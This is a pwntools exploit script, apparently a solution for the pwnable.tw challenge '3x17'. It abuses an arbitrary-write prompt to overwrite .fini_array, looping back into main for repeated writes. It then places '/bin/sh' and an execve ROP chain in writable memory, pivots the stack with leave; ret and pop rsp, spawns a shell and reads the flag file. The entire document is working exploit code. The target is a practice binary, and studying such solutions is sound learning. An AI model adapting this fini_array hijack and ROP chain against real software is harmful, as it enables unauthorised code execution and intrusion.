#!/usr/bin/env python3
from pwn import *

PORT = 10105
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./3x17', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000401C2E
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

fini_array_0 = 0x4b40f0
fini_array_1 = 0x4b40f8

main = 0x401B6D
libc_csu_fini = 0x402960

def overwrite(addr, val):
    p.sendafter(b"addr:", str(addr).encode())
    p.sendafter(b"data:", val)

pl = flat(
    libc_csu_fini,
    main
    )

overwrite(fini_array_0, pl)

pop_rax = 0x0041e4af
pop_rdi = 0x00401696
pop_rsi = 0x00406c30
pop_rdx = 0x00446e35
syscall = 0x004022b4
rw_binsh = 0x4b4000
rw_rop = 0x4b4010

overwrite(rw_binsh, b"/bin/sh\0")

ROP = flat(
        pop_rax, 0x3b,
        pop_rdi, rw_binsh,
        pop_rsi, 0,
        pop_rdx, 0,
        syscall
    )

for i in range(0, len(ROP), 24):
    pl = ROP[i:i+24]
    overwrite(rw_rop+i, pl)

pop_rsp = 0x00402ba9
leave_ret = 0x00474fbe

pl = flat(
    leave_ret,
    pop_rsp,
    rw_rop
    )

overwrite(fini_array_0, pl)
p.sendline(b"cat /home/3x17/the_4ns_is_51_fl4g")

p.interactive()